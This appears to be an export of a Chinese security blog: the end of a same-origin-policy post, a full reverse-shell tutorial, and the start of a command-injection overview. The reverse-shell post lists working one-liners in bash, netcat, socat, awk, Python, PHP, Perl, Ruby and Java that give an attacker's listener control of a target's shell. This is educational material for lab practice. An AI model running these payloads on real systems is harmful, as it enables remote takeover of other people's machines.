win.postMessage(obj,<span class="string">&#x27;http://server.com&#x27;</span>);  </span></span><br><span class="line">        &#125;  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>postMessage</code>的使用方法： otherWindow.postMessage(message, targetOrigin);</p>
<ul>
<li>otherWindow: 指目标窗口，也就是给哪个window发消息，是 window.frames 属性的成员或者由 window.open 方法创建的窗口</li>
<li>message: 是要发送的消息，类型为 String、Object (IE8、9 不支持)</li>
<li>targetOrigin: 是限定消息接收范围，不限制请使用 <code>*</code></li>
</ul>
<p>server.com上remote.html，监听<code>message</code>事件，并检查来源是否是要通信的域。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">window</span>.onmessage = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span>(e.origin !== <span class="string">&#x27;http://localhost:8088&#x27;</span>) <span class="keyword">return</span>;</span></span><br><span class="line"><span class="javascript">            alert(e.data.msg+<span class="string">&quot; from &quot;</span>+e.origin);</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h3 id="7、片段标识符"><a href="#7、片段标识符" class="headerlink" title="7、片段标识符"></a>7、片段标识符</h3><ul>
<li>原理：片段标识符（fragment identifier）指的是，URL的<code>#</code>号后面的部分，比如<code>http://example.com/x.html#fragment</code>的<code>#fragment</code>。如果只是改变片段标识符，页面不会重新刷新。</li>
</ul>
<p>父窗口可以把信息，写入子窗口的片段标识符。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> src = originURL + <span class="string">&#x27;#&#x27;</span> + data;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&#x27;myIFrame&#x27;</span>).src = src;</span><br></pre></td></tr></table></figure>
<p>子窗口通过监听<code>hashchange</code>事件得到通知。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.onhashchange = checkMessage;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkMessage</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> message = <span class="built_in">window</span>.location.hash;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同样的，子窗口也可以改变父窗口的片段标识符。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">parent.location.href= target + <span class="string">&quot;#&quot;</span> + hash;</span><br></pre></td></tr></table></figure>


<h2 id="内容安全策略（CSP）"><a href="#内容安全策略（CSP）" class="headerlink" title="内容安全策略（CSP）"></a>内容安全策略（CSP）</h2><p>CSP的主要目标是减少和报告XSS攻击. XSS攻击利用浏览器对从服务器接受的内容的信任。恶意的脚本在受害的浏览器被执行, 因为浏览器相信内容源，甚至当内容源并不是从它应该来的地方过来的。</p>
<p>CSP使服务器管理员能够通过制定浏览器能够执行的可信赖脚本的域名来减少或者消除由XSS可能出现的矢量。 一个兼容CSP的浏览器将只会执行加载与白名单域名的源文件的脚本，忽略那些其他的脚本（包括内联脚本和事件操控HTML属性）</p>
<p>具体内容可以看：<a class="link"   href="http://www.ruanyifeng.com/blog/2016/09/csp.html" >Content Security Policy 入门教程<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a class="link"   href="https://lightless.me/archives/review-SOP.html" >再谈同源策略<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://xz.aliyun.com/t/224" >跨域方法总结<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html" >浏览器同源政策及其规避方法<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>同源策略</tag>
      </tags>
  </entry>
  <entry>
    <title>反弹shell</title>
    <url>/2021/03/29/%E5%8F%8D%E5%BC%B9shell/</url>
    <content><![CDATA[<h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><p>​    在介绍反弹链接的时候先说明什么是正向链接：假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。而反弹shell是指攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。本质上是网络概念的客户端与服务端的角色反转。<strong>反弹shell简单来说就是通过命令让靶机的shell的控制权交到攻击者的机器中</strong>。</p>
<p>可能有人会问：我们都能够在靶机上直接执行命令了，为什么还反弹shell呢？这里有几种情况：</p>
<ol>
<li><p>某客户机中了你的网马，但是它在局域网内，你直接连接不了。</p>
</li>
<li><p>它的ip会动态改变，你不能持续控制。</p>
</li>
<li><p>由于防火墙等限制，对方机器只能发送请求，不能接收请求。</p>
</li>
<li><p>靶机执行的命令结果没有回显，无法直接获知运行的状态。</p>
</li>
</ol>
<p>这些情况都可以通过反弹shell来解决。</p>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>想反弹shell只需要一行或者几行命令，但是这里面涉及到的东西日常比较少用，需要大概了解一下才能弄明白这些命令到底做了什么东西。</p>
<h3 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h3><blockquote>
<p>Linux 系统中，把一切都看做是文件，当进程打开现有文件或创建新文件时，内核向进程返回一个文件描述符，文件描述符就是内核为了高效管理已被打开的文件所创建的索引，用来指向被打开的文件，所有执行I/O操作的系统调用都会通过文件描述符。</p>
</blockquote>
<p>当Linux启动的时候会默认打开三个文件描述符，分别是：</p>
<table>
<thead>
<tr>
<th>描述符</th>
<th>用途</th>
<th>stdio流</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>标准输入</td>
<td>stdin</td>
</tr>
<tr>
<td>1</td>
<td>标准输出</td>
<td>stdout</td>
</tr>
<tr>
<td>2</td>
<td>标准错误</td>
<td>stderr</td>
</tr>
</tbody></table>
<p><strong>文件所有输入输出都是由该进程所有打开的文件描述符控制的。（Linux一切皆文件，就连键盘显示器设备都是文件，因此他们的输入输出也是由文件描述符控制）</strong></p>
<p>一条命令执行以前先会按照默认的情况进行绑定（也就是上面所说的 0,1,2），如果我们有时候需要让输出不显示在显示器上，而是输出到文件或者其他设备，那我们就需要重定向。</p>
<h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><p>重定向主要分为两种(其他复杂的都是从这两种衍生而来的)：</p>
<ol>
<li>输入重定向 <code>&lt;</code>、<code> &lt;&lt;</code></li>
<li>输出重定向 <code>&gt;</code> 、<code>&gt;&gt;</code></li>
</ol>
<p><strong>重点</strong>：</p>
<ol>
<li><p>bash 在执行一条指令的时候，首先会检查命令中存不存在重定向的符号，如果存在那么首先将文件描述符重定向（之前说过了，输入输出操作都是依赖文件描述符实现的，重定向输入输出本质上就是重定向文件描述符），然后在把重定向去掉，执行指令</p>
</li>
<li><p>如果指令中存在多个重定向，那么不要随便改变顺序，因为重定向是从左向右解析的，改变顺序可能会带来完全不同的结果（这一点我们后面会展示）</p>
</li>
<li><p><code>&lt;</code> 是对标准输入 0 重定向 ，<code>&gt;</code> 是对标准输出 1 重定向</p>
</li>
<li><p><strong>再强调一下，重定向就是针对文件描述符的操作</strong></p>
</li>
</ol>
<h4 id="输入重定向"><a href="#输入重定向" class="headerlink" title="输入重定向"></a>输入重定向</h4><p>格式：（注意[n]与&lt;之间没有空格）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[n]&lt;word	</span><br></pre></td></tr></table></figure>
<p>说明：将文件描述符 n 重定向到 word 指代的文件（以只读方式打开）,如果 n 省略就是0（标准输入）</p>
<p>example:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># cat 0&lt;file</span></span><br><span class="line">hello wordl</span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># cat &lt;file</span></span><br><span class="line">hello wordl</span><br></pre></td></tr></table></figure>
<p>解释: 解析器解析到 <code>&lt;</code> 以后会先处理重定向，将标准输入重定向到file，之后cat再从标准输入读取指令的时候，由于标准输入已经重定向到了file ，于是cat就从file中读取指令了。</p>
<h4 id="输出重定向"><a href="#输出重定向" class="headerlink" title="输出重定向"></a>输出重定向</h4><p>格式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[n]&gt;word	</span><br></pre></td></tr></table></figure>
<p>说明： 将文件描述符 n 重定向到 word 指代的文件（以写的方式打开），如果 n 省略则默认就是 1（标准输出）</p>
<p>example：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># echo hello&gt;file</span></span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># cat file</span></span><br><span class="line">hello</span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># &gt;file echo world</span></span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># cat file</span></span><br><span class="line">world</span><br></pre></td></tr></table></figure>


<h4 id="标准输出与标准错误输出重定向"><a href="#标准输出与标准错误输出重定向" class="headerlink" title="标准输出与标准错误输出重定向"></a>标准输出与标准错误输出重定向</h4><p>格式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&amp;&gt; word </span><br><span class="line">&gt;&amp; word</span><br></pre></td></tr></table></figure>
<p>说明:将标准输出与标准错误输出都定向到word代表的文件（以写的方式打开），两种格式意义完全相同，这种格式完全等价于 <code>&gt; word 2&gt;&amp;1</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># mkdir &amp;&gt; file</span></span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># cat file</span></span><br><span class="line">mkdir: missing operand</span><br><span class="line">Try <span class="string">&#x27;mkdir --help&#x27;</span> <span class="keyword">for</span> more information.</span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># ls &amp;&gt; file</span></span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># cat file</span></span><br><span class="line">checksite.sql</span><br><span class="line">DVWA-master</span><br><span class="line">file</span><br><span class="line">make-pdf_V0_1_6</span><br><span class="line">sql.php</span><br><span class="line">sz_checksite</span><br><span class="line">test.txt</span><br></pre></td></tr></table></figure>


<h4 id="文件描述符的复制"><a href="#文件描述符的复制" class="headerlink" title="文件描述符的复制"></a>文件描述符的复制</h4><p>格式：**(这里所有字符之间不要有空格)**</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[n]&lt;&amp;[m] </span><br><span class="line">[n]&gt;&amp;[m] </span><br></pre></td></tr></table></figure>
<p>说明：</p>
<ol>
<li><p>这里两个<strong>都是将文件描述符 n 复制到 m</strong> ，两者的区别是，前者是以只读的形式打开，后者是以写的形式打开，<strong>因此 0&lt;&amp;1 和 0&gt;&amp;1 是完全等价的（读/写方式打开对其没有任何影响）</strong></p>
</li>
<li><p>这里的 &amp; 目的是为了区分数字名字的文件和文件描述符，如果没有 &amp; 系统会认为是将文件描述符重定向到了一个数字作为文件名的文件，而不是一个文件描述符。</p>
</li>
</ol>
<p><strong>重点：</strong></p>
<p>之前我们说过，重定向符号的顺序不能随便换，因为系统是从左到右执行的，我们下面就举一个例子</p>
<ul>
<li>cmd &gt; file 2&gt;&amp;1</li>
</ul>
<p>这个是先把标准输出<code>stdout1</code>重定向到file文件中，然后把标准错误<code>stderr2</code>重定向到标准输出所指向的文件中，也就是file。</p>
<ul>
<li>cmd 2&gt;&amp;1 &gt;file</li>
</ul>
<p>这一个是先把标准错误<code>stderr2</code>重定向到标准输出<code>stdout1</code>所指向的文件，这里默认是屏幕，然后再把标准输出<code>stdout1</code>重定向到file文件中。</p>
<h4 id="exec-绑定重定向"><a href="#exec-绑定重定向" class="headerlink" title="exec 绑定重定向"></a>exec 绑定重定向</h4><p>格式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> [n] &lt;/&gt; file/[n]</span><br></pre></td></tr></table></figure>
<p>上面的输入输出重定向将输入和输出绑定文件或者设备以后只对当前的那条指令有效，如果需要接下来的指令都支持的话就需要使用 exec 指令</p>
<p><strong>重点：</strong></p>
<p>格式： </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[n]&lt;&gt;word</span><br></pre></td></tr></table></figure>
<p>说明：以读写方式打开word指代的文件，并将n重定向到该文件。如果n不指定的话，默认为标准输入。</p>
<p>example：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># exec 3&lt;&gt;file</span></span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># ls &gt;&amp;3</span></span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># cat file</span></span><br><span class="line">checksite.sql</span><br><span class="line">DVWA-master</span><br><span class="line">file</span><br><span class="line">make-pdf_V0_1_6</span><br><span class="line">sql.php</span><br><span class="line">sz_checksite</span><br><span class="line">test.txt</span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># exec 3&lt;&gt;file</span></span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># cat &lt;&amp;3</span></span><br><span class="line">checksite.sql</span><br><span class="line">DVWA-master</span><br><span class="line">file</span><br><span class="line">make-pdf_V0_1_6</span><br><span class="line">sql.php</span><br><span class="line">sz_checksite</span><br><span class="line">test.txt</span><br></pre></td></tr></table></figure>


<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>学完了前置知识，接下来就看看反弹shell的原理部分。</p>
<p>实验环境：</p>
<ul>
<li><p>靶机（Ubuntu）IP：192.168.91.144</p>
</li>
<li><p>攻击机（Kali）IP：192.168.91.128</p>
</li>
</ul>
<p>首先在攻击机上开启监听端口：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvp 2333</span><br></pre></td></tr></table></figure>
<p>然后再靶机上执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.91.128/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>然后就可以看到攻击机控制了靶机的shell</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210325215552795.png" alt="image-20210325215552795"></p>
<p>命令解释：</p>
<ul>
<li><p><strong>bash -i</strong></p>
<ol>
<li><p>bash 是linux 的一个比较常见的shell,其实linux的shell还有很多，比如 sh、zsh、等，他们之间有着细小差别</p>
</li>
<li><p>-i 这个参数表示的是产生交互式的shell</p>
</li>
</ol>
</li>
<li><p><strong>/dev/tcp/ip/port</strong></p>
</li>
</ul>
<p>/dev/tcp|udp/ip/port 这个文件是特别特殊的，实际上可以将其看成一个设备（Linux下一切皆文件），其实如果你访问这个文件的位置他是不存在的。但是如果你在一方监听端口的情况下对这个文件进行读写，就能实现与监听端口的服务器的socket通信。</p>
<p>example：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#靶机输入</span></span><br><span class="line">root@ubuntu18:~<span class="comment"># echo hello world &gt; /dev/tcp/192.168.91.128/2333</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#攻击机接收</span></span><br><span class="line">root@kali:~<span class="comment"># nc -lvp 2333</span></span><br><span class="line">listening on [any] 2333 ...</span><br><span class="line">192.168.91.144: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.91.128] from (UNKNOWN) [192.168.91.144] 32960</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure>
<p>example：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#攻击机输入</span></span><br><span class="line">root@kali:~<span class="comment"># nc -lvp 2333</span></span><br><span class="line">listening on [any] 2333 ...</span><br><span class="line">hello world</span><br><span class="line">192.168.91.144: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.91.128] from (UNKNOWN) [192.168.91.144] 32964</span><br><span class="line">I am a good boy</span><br><span class="line"></span><br><span class="line"><span class="comment">#靶机接收</span></span><br><span class="line">root@ubuntu18:~<span class="comment"># cat &lt; /dev/tcp/192.168.91.128/2333</span></span><br><span class="line">hello world</span><br><span class="line">I am a good boy</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>交互重定向</strong></li>
</ul>
<p>把上述的两个命令组合起来并使用重定向：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.91.128/2333</span><br></pre></td></tr></table></figure>
<p>这样就把靶机的shell的标准输出和标准错误给重定向到了攻击机上，这时候我们靶机上已经无法显示东西，但是仍然能够输入命令（只是在靶机上看不见），而命令输出的结果在攻击机上显示。</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210325221535454.png" alt="image-20210325221535454"></p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210325221526338.png" alt="image-20210325221526338"></p>
<p>这样还不够，攻击机还需要获得靶机的输入控制权，于是可以在命令的末尾加上把标准输入<code>stdin0</code>重定向到标准输出或者标准错误输出所指向的文件即可：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.91.128/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>


<h2 id="常见利用语句"><a href="#常见利用语句" class="headerlink" title="常见利用语句"></a>常见利用语句</h2><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h4 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.91.128/2333 0&gt;&amp;1</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.91.128/2333 0&lt;&amp;1</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.91.128/2333 &lt;&amp;2</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.91.128/2333 0&lt;&amp;2</span><br></pre></td></tr></table></figure>
<p>文件的读/写打开方式对于文件描述符来讲并没有什么区别</p>
<h4 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/192.168.91.128/2333;cat &lt;&amp;5|<span class="keyword">while</span> <span class="built_in">read</span> line;<span class="keyword">do</span> <span class="variable">$line</span> &gt;&amp;5 2&gt;&amp;1;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>解释：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/192.168.91.128/2333;</span><br></pre></td></tr></table></figure>
<p>这一句将文件描述符5重定向到了 <code>/dev/tcp/192.168.91.128/2333</code> 并且方式是<strong>读写方式</strong>，于是我们就能通过文件描述符对这个socket连接进行操作了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat &lt;&amp;5|<span class="keyword">while</span> <span class="built_in">read</span> line;<span class="keyword">do</span> <span class="variable">$line</span> &gt;&amp;5 2&gt;&amp;1;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>首先从文件描述符5中读取传过来的命令，通过管道符传到后面的命令，从文件中依次读取每一行，将其赋值给 line 变量（当然这里变量可以很多，以空格分隔，这里我就举一个变量的例子，如果是一个变量的话，那么一整行都是它的了），之后再在循环中对line进行操作。并将操作结果的标准输出和标准错误输出都重定向到了文件描述符5，也就是攻击机上，实现交互式shell的功能。</p>
<p>example:</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210325223538469.png" alt="image-20210325223538469"></p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210325223556753.png" alt="image-20210325223556753"></p>
<h4 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h4><p>nc如果版本是有 -e 选项的话就能够直接反弹shell，出于安全原因，Ubuntu自带的nc是不带这个选项的。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -e /bin/sh 192.168.91.128 2333</span><br></pre></td></tr></table></figure>
<p>如果没有 -e 选项的话还可以使用：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.91.128 2333 &gt;/tmp/f</span><br></pre></td></tr></table></figure>
<p>mkfifo 命令首先创建了一个管道，cat 将管道里面的内容输出传递给/bin/sh，sh会执行管道里的命令并将标准输出和标准错误输出结果通过nc 传到该管道，由此形成了一个回路</p>
<p>example:</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210326115210794.png" alt="image-20210326115210794"></p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210326115224913.png" alt="image-20210326115224913"></p>
<h4 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h4><p>攻击机上打开两个终端分别执行监听：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvp 4444</span><br><span class="line">nc -lvp 5555</span><br></pre></td></tr></table></figure>
<p>靶机中执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">telnet 192.168.91.128 4444 | /bin/bash | telnet 192.168.91.128 5555</span><br></pre></td></tr></table></figure>
<p>从4444端口获取到命令，bash 运行后将命令执行结果返回 5555 端口，攻击者主机上也是打开两个终端分别执行监听。</p>
<p>example：</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210326121226183.png" alt="image-20210326121226183"></p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210326121243836.png" alt="image-20210326121243836"></p>
<h4 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk <span class="string">&#x27;BEGIN&#123;s=&quot;/inet/tcp/0/192.168.91.128/2333&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;&#x27;</span></span><br></pre></td></tr></table></figure>


<h4 id="socat"><a href="#socat" class="headerlink" title="socat"></a>socat</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socat <span class="built_in">exec</span>:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:192.168.91.128:2333</span><br></pre></td></tr></table></figure>


<h4 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;192.168.91.128&#x27;,2333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span></span><br></pre></td></tr></table></figure>


<h4 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;192.168.91.128&quot;,5555);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>


<h4 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;192.168.99.242&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure>


<h4 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e<span class="string">&#x27;f=TCPSocket.open(&quot;192.168.91.128&quot;,2333).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span></span><br></pre></td></tr></table></figure>


<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Revs</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> args</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@throws</span> Exception </span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line">        String cmd[]= &#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/x.x.x.x/5555;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>&#125;;</span><br><span class="line">        Process p = r.exec(cmd);</span><br><span class="line">        p.waitFor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><p>当我们使用Ubuntu作为服务器，是无法直接通过使用命令执行的函数如<code>system()</code>等去执行<code>bash</code>命令，会显示<code>sh: 1: Syntax error: Bad fd number</code>，这个错误在centos中是不会出现的，这是因为ubuntu从6.10开始，默认使用dash（登录还是用bash），因为dash更快更高效。只要把bash链接到sh即可。</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/20190115161623.png" alt="img"></p>
<h3 id="Window"><a href="#Window" class="headerlink" title="Window"></a>Window</h3><p>由于把Window作为服务器比较少见，在加上里面很多东西我也没见过，这里贴个链接，以备不时之需。</p>
<p><a class="link"   href="https://lipeilipei.top/2020/10/01/windows%E5%8F%8D%E5%BC%B9shell/" >Windows 反弹 shell<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a class="link"   href="https://xz.aliyun.com/t/2548" >Linux反弹shell（一）文件描述符与重定向<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://xz.aliyun.com/t/2549#toc-10" >Linux 反弹shell（二）反弹shell的本质<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>反弹shell</tag>
      </tags>
  </entry>
  <entry>
    <title>命令注入总结</title>
    <url>/2021/03/29/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="命令注入总结"><a href="#命令注入总结" class="headerlink" title="命令注入总结"></a>命令注入总结</h1><p>命令注入是通过易受攻击的应用程序在主机操作系统上执行任意命令。在此攻击中，攻击者提供的操作系统命令通常以易受攻击的应用程序的权限执行。 命令注入攻击很可能主要是由于输入验证不足。此攻击与代码注入不同，因为代码注入允许攻击者添加自己的代码，然后由应用程序执行。 在命令注入中，攻击者扩展了执行系统命令的应用程序的默认功能，而无需注入代码。</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>当应用程序将不安全的用户提供的数据（表单，cookie，HTTP标头等）不经过检查过滤就传递给系统shell时，可能会发生命令注入攻击。 </p>
<h2 id="常见的危险函数"><a href="#常见的危险函数" class="headerlink" title="常见的危险函数"></a>常见的危险函数</h2><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><h4 id="system"><a href="#system" class="headerlink" title="system"></a>system</h4><p>执行 <code>command</code> 参数所指定的命令， 并且输出执行结果。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">system ( <span class="keyword">string</span> <span class="variable">$command</span> , <span class="keyword">int</span> &amp;<span class="variable">$return_var</span> = ? ) : <span class="keyword">string</span></span><br></pre></td></tr></table></figure>
<p>command：要执行的命令。</p>
